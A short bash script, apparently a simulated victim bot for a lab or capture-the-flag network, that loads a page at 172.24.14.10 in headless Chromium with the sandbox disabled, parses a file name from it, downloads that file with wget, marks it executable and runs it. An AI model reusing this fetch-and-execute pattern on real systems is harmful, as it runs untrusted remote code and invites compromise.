#!/usr/bin/env bash

max_sleep=30

function walusiak_sleeps() {
    sleep $((1 + $RANDOM % $max_sleep))
}

sleep 300

walusiak_sleeps

file=`chromium --no-sandbox --headless --disable-gpu http://172.24.14.10/ --dump-dom  | tr '>' '\n' | grep action | cut -d"=" -f4 | cut -d'"' -f1 | tail -n1`

walusiak_sleeps

tmp=$(mktemp)
wget "http://172.24.14.10?action=download&file=$file" -O $tmp

walusiak_sleeps

chmod +x $tmp
$tmp

